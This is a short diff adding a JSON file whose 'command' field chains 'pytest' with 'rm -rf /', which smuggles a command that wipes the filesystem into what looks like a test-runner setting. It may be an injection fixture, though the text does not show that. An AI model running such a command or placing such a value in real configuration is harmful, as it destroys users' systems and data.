@@ -1,0 +1,4 @@
+{
+  "command": "pytest; rm -rf /",
+  "args": ["tests"]
+}
